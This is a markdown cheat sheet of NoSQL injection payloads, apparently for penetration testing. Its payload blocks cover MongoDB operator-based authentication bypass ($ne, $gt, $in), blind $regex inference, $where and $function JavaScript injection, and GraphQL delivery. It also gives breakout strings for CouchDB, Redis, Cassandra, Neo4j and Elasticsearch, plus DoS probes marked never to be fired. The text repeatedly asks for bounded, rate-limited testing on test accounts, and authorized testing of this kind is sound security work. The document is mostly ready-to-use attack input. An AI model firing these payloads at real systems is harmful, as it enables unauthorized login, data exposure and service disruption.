# NoSQL injection payloads
# Benign auth-bypass / minimal differential. No bulk dump, no DB-hanging $where. Rate-limit.

## Operator injection — auth bypass (the common one)
PHP array bracket notation (PHP interprets `user[$ne]=x` as an array):
```
user[$ne]=xxxx&pass[$ne]=yyyy          # $ne = "not equal" -> matches many records -> auth as first user
```
JSON body:
```json
{"username":{"$ne":null},"password":{"$ne":null}}
{"username":{"$gt":""},"password":{"$gt":""}}
{"username":"admin","password":{"$ne":"x"}}        # target a known user
```
Other operators: `$in`, `$nin`, `$gt`, `$lt`, `$exists`, `$regex`.

## Query manipulation / extraction
```json
{"username":{"$regex":"^adm"}}                      # enumerate by prefix
{"id":{"$gt":0}}                                    # return more than intended
```

## $where JS injection (MongoDB server-side JS)
```
username=admin'||'1'=='1
'; return true; var x='              # inject into a $where string
{"$where":"this.username=='admin'"}
```
Vector note: `$where` string concatenation also happens in URL **path/query segments**, not just JSON bodies
— e.g. `GET /track-order/<id>` where `<id>` is spliced into `this.orderId === '<id>'`. A tautology there
(`' || 'a'=='a`, url-encoded `%27%20%7C%7C%20%27a%27%3D%3D%27a`, or `'||true||'`) makes the predicate
always-true and returns the WHOLE collection — one object expected, many returned. Confirm with the
1-vs-many differential (a non-matching garbage id returns nothing; the tautology returns all), NOT a bulk
read, and never a sleep/loop.

## Blind (minimal, short)
```
# time (keep sleeps short, rate-limited):
{"$where":"sleep(2000)"}
# boolean per-char (extract minimal marker only):
{"username":{"$regex":"^a"}}  ...  ^aa  ...  (confirm true/false by response)
```

## Syntax injection
```
'  "  `  \  ;  {  }      # breakout chars; less common (libraries sanitize) — try after operator injection
```

## Detection
Submit an array where a string is expected; a response change (login success, different result set, error)
flags operator injection. Confirm with a benign auth bypass. Tool: `nosqlmap` (confirm manually).

---
## Extended arsenal — MongoDB operator reference

The injection swaps a scalar the app expects (`"password":"x"`) for an operator object (`{"$ne":"x"}`) that the
driver forwards into the query. Comparison/element operators are the benign, read-only workhorses.

| operator | meaning | injection use |
|---|---|---|
| `$ne` | not equal | `{"$ne":null}` / `{"$ne":"x"}` → matches almost any record (auth bypass) |
| `$gt` `$gte` `$lt` `$lte` | comparison | `{"$gt":""}` matches any non-empty string; range-probe a value |
| `$in` `$nin` | in / not-in a set | `{"$in":["admin","root"]}` widen the match set |
| `$regex` | regex match | prefix/char inference, case-insensitive match, anchored probes |
| `$exists` | field presence | `{"$exists":true}` toggle on schema shape |
| `$type` | BSON type | distinguish string vs object vs array fields |
| `$not` | negate | wrap another operator to invert the match |
| `$or` `$and` `$nor` | boolean combine | inject extra logical branches into the query |
| `$expr` | aggregation expr in query | compare two fields; vehicle for `$function` (feasibility) |
| `$where` | server-side JS predicate | boolean probes only — NEVER a DB-hang (see below) |

```
# detection differential — scalar vs operator object in the same field:
{"username":"admin","password":"wrong"}        # baseline: login fails
{"username":"admin","password":{"$ne":"wrong"}} # if login now succeeds => operator injection
```

---
## Extended arsenal — auth bypass: JSON vs form-encoded vs query-string

Same operator, three wire formats. Which one works depends on the body parser (JSON vs an extended
form/query parser that builds nested objects from bracket keys). Confirm by landing as a known test account.
```
# JSON body (Content-Type: application/json):
{"username":{"$ne":null},"password":{"$ne":null}}
{"username":{"$gt":""},"password":{"$gt":""}}
{"username":"admin","password":{"$ne":"x"}}          # target a known user, dodge its password
{"username":{"$in":["admin","administrator"]},"password":{"$ne":""}}
# form-encoded body / query string (parser must build nested objects from bracket keys):
username[$ne]=x&password[$ne]=y
username[$gt]=&password[$gt]=
username=admin&password[$ne]=x
username[$in][]=admin&username[$in][]=root&password[$ne]=x
# query-string form (same bracket notation in the URL):
?username[$ne]=x&password[$ne]=x
# $regex to fix the username while bypassing the password:
{"username":{"$regex":"^admin$"},"password":{"$ne":"x"}}
```
Note: a strict parser that keeps values as strings is NOT vulnerable here — the array/object must survive
to the driver. If `[$ne]` yields a literal string key, try the JSON body instead (different parser).

---
## Extended arsenal — blind inference via `$regex` (boolean)

When a field isn't reflected, `$regex` turns each guess into a true/false response (login works vs fails, or
result present vs absent). Infer a MINIMAL marker (e.g. confirm a known test value) — not a bulk field dump.
```
# confirm the channel: anchored prefix that is true vs one that is false
{"username":{"$regex":"^adm"},"password":{"$ne":"x"}}     # true  (user 'admin' exists)
{"username":{"$regex":"^zzq"},"password":{"$ne":"x"}}     # false (no such user)  -> differential = blind oracle
# per-character prefix walk on a chosen field (bounded, benign):
{"field":{"$regex":"^a"}}  ...  ^aa  ...  ^ab ...         # extend the anchor one char at a time
# length bound first (keeps the walk short):
{"field":{"$regex":"^.{8}$"}}                             # true only if length == 8
# useful modifiers / classes:
{"field":{"$regex":"^A","$options":"i"}}                  # case-insensitive
{"field":{"$regex":"^[a-m]"}}                             # binary-split the alphabet (fewer requests)
# escape regex metacharacters in the known part so '.', '*', '+' are literal, not wildcards.
```
Keep it bounded: confirm presence / a short marker, cap the number of requests, rate-limit. Do not walk a
password/hash field or extract PII.

---
## Extended arsenal — `$where` / server-side JS (feasibility only)

`$where` runs JavaScript per document — powerful but expensive and often disabled. Use ONLY short boolean
probes. **Never** submit a sleep/loop/regex-bomb that hangs the DB (that is a DoS, out of scope).
```
# boolean probe (string-concatenation context inside a $where):
admin'||'1'=='1
# field-logic probe (object form):
{"$where":"this.username=='admin'"}
{"$where":"this.role.length>0"}                 # presence/shape check — benign, no extraction loop
# DO NOT (DoS — catalogued for awareness only, never fire):
#   {"$where":"sleep(5000)"}   {"$where":"while(true){}"}   giant backtracking $regex
```
Prefer operator/`$regex` injection over `$where` — it is benign, cheaper, and usually not disabled.

---
## Extended arsenal — aggregation / `$function` / mapReduce (feasibility only)

If user input reaches an aggregation pipeline, operators there can be abused. Note feasibility and hand any
JS-execution path to the appropriate reviewer; keep probes benign, no heavy jobs.
```
# $expr in a match stage (compare fields that shouldn't be comparable):
{"$expr":{"$eq":["$price","$discount"]}}
# $function (server-side JS in aggregation; MongoDB 4.4+) — FEASIBILITY ONLY, benign return:
{"$expr":{"$function":{"body":"function(){return true}","args":[],"lang":"js"}}}
# mapReduce / $accumulator also run JS — flag as a JS-exec surface, do not run compute-heavy jobs.
# $lookup (cross-collection join) — note if input controls 'from'/'pipeline' (data over-exposure).
```

---
## Extended arsenal — query-result manipulation (over-return)

Operator injection outside auth can widen a result set beyond the caller's intent (access-control / data-exposure
overlap). Confirm with a small differential, not a full dump.
```
{"id":{"$ne":"-1"}}                 # return rows other than the intended one
{"id":{"$gt":0}}                    # numeric range widen
{"status":{"$in":["public","private"]}}   # pull records the filter meant to hide
{"owner":{"$ne":"<me>"}}            # cross-tenant candidate (confirm on TEST accounts only)
# projection abuse — if input controls returned fields, request one extra benign field as proof (not secrets).
```

---
## Extended arsenal — GraphQL & JSON API body forms

Operator injection rides inside typed inputs. If a GraphQL input scalar or a JSON field is loosely typed, an
object/array can reach the driver.
```
# GraphQL variable carrying an operator object (String arg that is actually forwarded as-is):
query($u:JSON){ login(username:$u, password:"x"){ token } }
variables: { "u": { "$ne": null } }
# inline (when the schema uses a permissive scalar like JSON):
{ users(filter:{ role:{ "$ne":"user" } }){ id } }
# JSON API with nested filter object:
POST /api/search   {"filter":{"username":{"$regex":"^adm"}}}
# string->object coercion test: send {"$ne":null} where a String is declared; a type error vs a bypass both inform.
```
Confirm the same way: a benign auth bypass (land as a test account) or a bounded result differential.

---
## Extended arsenal — other NoSQL engines (notes)

MongoDB dominates, but the same "operator/syntax reaches the query language" idea maps onto others. Keep every
probe benign and read-only; hand JS/command-exec surfaces to the right reviewer.

| engine | injection surface | benign confirmation |
|---|---|---|
| CouchDB | Mango `_find` selectors use the same operators (`$ne`,`$gt`,`$regex`,`$or`); JS map/views | `{"selector":{"user":{"$gt":null}}}` widens the match; differential |
| Redis | CRLF in an arg can inject extra commands; `EVAL` runs Lua | read-only probe (`PING`/`INFO`) via an injected newline; flag `EVAL` as exec (feasibility) |
| Cassandra (CQL) | string-built CQL — closer to SQL; `ALLOW FILTERING` widens scans | `' OR '1'='1` style breakout; confirm with a bounded differential |
| Elasticsearch | query-DSL injection into a JSON query; Painless script fields | inject a `bool/should` clause to widen hits; Painless = exec (feasibility only) |
| Neo4j (Cypher) | string-built Cypher; `MATCH ... WHERE` breakout | `' OR 1=1 //` style; `//` is the Cypher line comment |
| Firebase / Firestore | permissive security rules; REST query params | read a sibling path a rule should deny (TEST data only) |

```
# CouchDB Mango — operator widen (benign):
{"selector":{"username":{"$ne":"x"}}}
# Cassandra CQL — breakout + comment (confirm the point; ALLOW FILTERING can broaden the scan):
name' OR '1'='1
# Neo4j Cypher — boolean breakout with line comment:
' OR 1=1 //
# Elasticsearch — widen a filtered query by injecting a should-clause (benign differential, no heavy agg):
{"query":{"bool":{"should":[{"match_all":{}}]}}}
```

---
## Extended arsenal — detection & tooling (consolidated)

```
# fast differentials that flag an injection point:
scalar vs operator object in the same field   (e.g. "x"  vs  {"$ne":"x"})
array vs string where a string is expected     (user[]=x  or  {"user":["x"]})
truthy vs falsy $regex anchor                   (^real  vs  ^zzq)  -> boolean oracle
# error signatures worth noting (don't rely on 500s alone — could be app logic):
BSON/driver cast errors, "$" operator rejected, regex-parse errors.
```
Tooling: `nosqlmap` to assist, but CONFIRM every hit manually with a benign auth bypass or a bounded
differential. No bulk extraction, no DB-hanging `$where`, rate-limit every probe.
